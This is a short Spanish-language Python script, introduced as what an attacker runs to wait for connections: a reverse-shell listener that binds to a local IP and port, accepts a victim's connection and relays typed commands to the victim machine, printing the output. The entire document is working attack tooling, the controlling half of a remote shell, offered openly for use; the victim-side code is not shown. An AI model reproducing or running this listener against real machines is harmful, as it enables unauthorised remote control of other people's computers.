## Este es el script que tiene que ejecutar el atacante para quedarse a la escucha:

import socket

server=socket.socket()
server.bind(('192.168.0.3',8080)) # Aquí ponemos la IP de nuestra máquina atacante donde se conectará la víctima.
server.listen(1)

while True:
    victima,direccion=server.accept()
    print('Conexion de: {}'.format(direccion))
    msjBinario=victima.recv(1024)
    msjCodificado=msjBinario.decode("ascii")

    if msjCodificado == "1":
        while True:
            opcion = input("shell@shell: ")
            victima.send(opcion.encode("ascii"))
            resultado=victima.recv(2048)
            print(resultado)
    else:
        print("Error")
        break